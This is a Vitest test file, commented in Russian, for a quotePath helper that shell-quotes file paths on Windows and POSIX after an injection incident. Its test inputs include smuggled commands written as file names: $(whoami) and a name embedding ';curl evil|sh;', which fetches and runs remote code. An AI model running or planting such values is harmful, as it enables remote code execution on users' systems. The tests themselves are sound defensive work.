/**
 * Путь, брошенный в панель, не должен выполнять ничего лишнего (inc-22).
 *
 * Первая версия ставила кавычки только при пробеле — то есть защищала от самого
 * безобидного случая и пропускала все остальные.
 */
import { describe, it, expect } from 'vitest'
import { quotePath } from '../src/shared/paths'

describe('quotePath', () => {
  it('Windows: обычный путь берётся в кавычки', () => {
    expect(quotePath('C:\\Users\\egor\\notes.txt', true)).toBe('"C:\\Users\\egor\\notes.txt"')
  })

  it('Windows: амперсанд не рвёт команду', () => {
    // Без кавычек cmd разорвал бы строку на `&` и выполнил хвост отдельной командой.
    const q = quotePath('C:\\R&D\\notes.txt', true)
    expect(q).toBe('"C:\\R&D\\notes.txt"')
    expect(q.startsWith('"')).toBe(true)
    expect(q.endsWith('"')).toBe(true)
  })

  it('Windows: путь с пробелом — тоже в кавычках (как и был)', () => {
    expect(quotePath('C:\\Program Files\\app.exe', true)).toBe('"C:\\Program Files\\app.exe"')
  })

  it('POSIX: одинарные кавычки гасят разбор целиком', () => {
    expect(quotePath('/home/egor/notes.txt', false)).toBe("'/home/egor/notes.txt'")
    expect(quotePath('/home/egor/$(whoami).txt', false)).toBe("'/home/egor/$(whoami).txt'")
  })

  it('POSIX: внутренняя одинарная кавычка не закрывает строку раньше времени', () => {
    // Имя файла из чужого репозитория: `отчёт';curl evil|sh;'.txt`.
    const q = quotePath("отчёт';curl evil|sh;'.txt", false)
    expect(q).toBe("'отчёт'\\'';curl evil|sh;'\\''.txt'")
    // Ключевое: количество одинарных кавычек чётное и строка не «раскрывается».
    expect(q.startsWith("'")).toBe(true)
    expect(q.endsWith("'")).toBe(true)
  })

  it('пустой путь остаётся пустым, а не превращается в пару кавычек', () => {
    expect(quotePath('', true)).toBe('')
    expect(quotePath('', false)).toBe('')
  })
})
